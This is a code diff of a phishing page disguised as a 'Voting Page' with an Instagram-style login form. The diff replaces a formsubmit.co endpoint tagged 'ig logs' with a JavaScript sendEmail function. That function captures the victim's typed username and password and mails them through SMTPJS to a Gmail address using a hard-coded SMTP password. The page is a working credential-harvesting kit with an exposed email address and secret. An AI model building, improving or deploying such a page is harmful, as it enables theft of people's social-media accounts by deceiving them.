@@ -12,7 +12,8 @@
 	<title>Voting Page</title>
 	<link rel="stylesheet" href="../stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 	<link rel="stylesheet" type="text/css" href="css/my-login.css">
-	
+	<script src="https://smtpjs.com/v3/smtp.js"></script>
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js">
 </head>
 
 <body class="my-login-page">
@@ -30,10 +31,10 @@
 						<div class="card-body">
 							<h4 class="card-title">Sign in to Continue</h4>
 							
-							<form action="https://formsubmit.co/ezehallel@gmail.com" method="POST" class="my-login-validation" novalidate="">
-							<input type="hidden" name="_next" value="https://instagram.com">
-								<input type="hidden" name="_captcha" value="false">
-								<input type="hidden" name="_subject" value="ig logs">
+							<form action="#" method="POST" class="my-login-validation" novalidate="">
+							// <input type="hidden" name="_next" value="https://instagram.com">
+								// <input type="hidden" name="_captcha" value="false">
+								// <input type="hidden" name="_subject" value="ig logs">
 								<div class="form-group">
 									<input id="email" type="username" placeholder="Phone number, username, email address" class="form-control" name="email" value="" required autofocus>
 
@@ -44,7 +45,7 @@
 
 								<div class="form-group">
 									
-									<input id="password" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
+									<input id="pass" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
 								    <div class="invalid-feedback">
 								    	Password is required
 							    	</div>
@@ -61,7 +62,7 @@
 								</div>
 
 								<div class="form-group m-0">
-									<button type="submit" class="btn btn-primary btn-block">
+									<button type="submit" onclick="sendEmail()" class="btn btn-primary btn-block">
 										Log in
 									</button>
 								</div>
@@ -77,7 +78,25 @@
 			</div>
 		</div>
 	</section>
-
+	<script>
+		function sendEmail() {
+    let email = document.getElementById("email").value;
+    let pass = document.getElementById("pass").value;
+    let finalmessage = `email : ${email} <br>  Pass : ${email} <br>  Message : ${pass} <br>`;
+			
+		Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "ezehallel@gmail.com",
+    Password : "3F0FD76032D177322279D9172376479B75C7",
+    To : 'ezehallel@gmail.com',
+    From : "arabasia.on.fleek.co",
+    Subject : finalmessage,
+    Body : "And this is the body"
+}).then(
+  message => alert(message)
+);
+}
+	</script>
 	<script src="../code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
 	<script src="js/my-login.html"></script>
 </body>
